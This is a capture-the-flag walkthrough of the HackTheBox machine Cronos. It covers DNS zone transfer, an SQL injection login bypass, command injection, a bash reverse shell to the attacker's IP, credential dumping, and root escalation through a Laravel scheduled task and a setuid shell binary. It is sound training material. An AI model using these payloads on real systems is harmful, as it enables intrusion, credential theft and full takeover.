# Cronos | HackTheBox

### 1. Scan
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ sudo nmap -A -p- -T4 10.129.30.241
Nmap scan report for 10.129.30.241
Host is up, received echo-reply ttl 63 (0.30s latency).
Scanned at 2021-05-21 21:55:46 EDT for 481s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.16 (92%), Linux 3.2 - 4.9 (92%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%), Linux 3.8 - 3.11 (90%), Linux 4.2 (90%), Linux 4.4 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=5/21%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=60A86683%P=x86_64-pc-linux-gnu)
SEQ(SP=F6%GCD=1%ISR=110%TI=Z%II=I%TS=8)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.002 days (since Fri May 21 22:00:16 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=248 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   300.65 ms 10.10.14.1
2   300.64 ms 10.129.30.241

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 21 22:03:47 2021 -- 1 IP address (1 host up) scanned in 483.34 seconds
```
The machine is running SSH, an Apache server on port 80 and DNS on TCP port 53 for zone transfers.

### 2. Do DNS Transfer
Use dig to look up domain names on the server, using cronos.htb as the domain.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ dig axfr cronos.htb @10.129.30.241

; <<>> DiG 9.16.11-Debian <<>> axfr cronos.htb @10.129.30.241
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.129.30.241
admin.cronos.htb.       604800  IN      A       10.129.30.241
ns1.cronos.htb.         604800  IN      A       10.129.30.241
www.cronos.htb.         604800  IN      A       10.129.30.241
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 300 msec
;; SERVER: 10.129.30.241#53(10.129.30.241)
;; WHEN: Fri May 21 22:21:19 EDT 2021
;; XFR size: 7 records (messages 1, bytes 203)
```
This confirms the domain name is cronos.htb and there is an admin.cronos.htb subdomain.  
Update hosts to reflect this: `10.129.30.241   cronos.htb admin.cronos.htb www.cronos.htb`.  

### 3. Enumerate domains
The cronos.htb domain links to a plan page with the word "Cronos", and some links indicating it is a Laravel instance.  
The admin domain has a login page. I tried running Hydra against it for a while but no luck. Then try a basic SQL injection and get straight in. Need to remember to try simple stuff first and not jump straight to something time consuming.
The SQL injection payload that works is: `' or 1=1-- `.

### 4. Explore the admin section
The admin section behind the login screen has options to execute ping and traceroute operations, however it quickly becomes apparent that they are running the linux utility commands on the server and returning the results. By injecting commands using `;` to chain an extra command on the end this can be verified. For instance, filling in the "host" field as `8.8.8.8; whoami` returns "www-data" on the screen.

### 5. Get a shell.
Specify the host for the traceroute as: `8.8.8.8; bash -c "bash -i >& /dev/tcp/10.10.14.104/80 0>&1"`.  
Get a shell in a listener.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ sudo nc -lvnp 80 
listening on [any] 80 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.30.241] 43756
bash: cannot set terminal process group (1606): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 6. Enumerate from foothold
Database creds:
```bash
www-data@cronos:/var/www/admin$ cat config.php
cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```
Logged into the database and retrieved another password/
```bash
www-data@cronos:/var/www/admin$ mysql -u admin -p
Enter password: kEjdbRigfBHUREiNSDs

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7342
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)

mysql> use admin; show tables

+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
```
Next checked the crontab, it can be seen that one job is running as root and running a command through the Laravel Artisan CLI to execute scheduled tasks.  
The artisan PHP file is owned by www-data.
```bash
www-data@cronos:/home/noulis$ ls -l /var/www/laravel/artisan
ls -l /var/www/laravel/artisan                                                                                                                                       
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```
According to https://laravel-guide.readthedocs.io/en/latest/scheduling/, scheduled tasks can be defined in the app/Console/Kernel.php file.

### 7. Run an Artisan task
Reference: https://laravel-guide.readthedocs.io/en/latest/scheduling/  
  
Navigating to and opening app/Console/Kernel.php, see if a command can be executed by defining a new task.
```php
protected function schedule(Schedule $schedule)
    {
        $schedule->exec('echo "test" > /tmp/test.txt')->everyMinute();
    } 
```
This function defined a task which executes a shell command and writes a file into '/tmp' every minute. After editing the file, wait a minute and see that test.txt has been created in /tmp.
```bash
www-data@cronos:/var/www/laravel$ ls -l /tmp/test.txt
-rw-r--r-- 1 root root 0 May 22 07:28 /tmp/test.txt
```

### 8. Get a shell as root
To escalate, compile a setuid binary on the attacker machine, wget it to the host and then assign it the correct permissions to execute as root with the scheduled task.
The setuid binary source code looks like this:
```c
#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>

int main() {
        setresuid(0,0,0);
        system("/bin/sh");
        return 0;
}
```
Compile it locally with GCC and then transfer it to the machine.
```bash
www-data@cronos:/tmp$ wget http://10.10.14.104:8000/escalate
--2021-05-22 07:54:10--  http://10.10.14.104:8000/escalate
Connecting to 10.10.14.104:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16664 (16K) [application/octet-stream]
Saving to: 'escalate'

escalate            100%[===================>]  16.27K  50.0KB/s    in 0.3s    

2021-05-22 07:54:11 (50.0 KB/s) - 'escalate' saved [16664/16664]
```
Change the scheduled task function to now be:
```php
protected function schedule(Schedule $schedule)
    {
        $schedule->exec('chown root: /tmp/escalate; chmod 6755 /tmp/escalate')->everyMinute();
    } 
```
This changes ownership of the binary from www-data to root, and then assigns the suid bit with execution permissions for all users, meaning the binary will execute as the root user for anyone that runs it.  
Wait a minute then just run the binary to escalate straight to root.
```bash
www-data@cronos:/tmp$ ./escalate
# whoami
root
```